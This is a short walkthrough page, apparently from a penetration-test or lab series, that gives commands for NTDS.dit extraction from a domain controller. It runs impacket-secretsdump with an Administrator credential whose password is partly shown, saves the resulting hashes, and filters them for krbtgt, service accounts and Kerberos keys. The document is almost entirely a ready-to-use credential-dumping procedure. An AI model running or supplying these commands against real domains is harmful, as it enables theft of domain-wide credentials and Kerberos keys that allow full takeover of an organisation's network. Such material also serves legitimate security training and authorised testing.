# 💻 Phase 8 Commands — NTDS Extraction & Domain Credential Dumping

## Execute NTDS Extraction with secretsdump

```bash
impacket-secretsdump solaris.local/Administrator:'(3vRP<REDACTED>'@192.168.10.7
```

### Purpose

Authenticates to the Domain Controller using privileged credentials and performs NTDS.dit extraction to recover domain authentication material.

---

## Save Extracted Credential Material

```bash
tee domain_hashes.txt
```

### Purpose

Stores extracted domain credential material locally for analysis and documentation.

---

## Filter Extracted Domain Accounts

```bash
grep "Administrator\|krbtgt\|svc_" domain_hashes.txt
```

### Purpose

Filters extracted credential material to identify privileged and service-related accounts.

---

## Review Extracted Kerberos Keys

```bash
grep "aes256\|aes128\|des-cbc-md5" domain_hashes.txt
```

### Purpose

Identifies extracted Kerberos encryption material associated with compromised domain accounts.
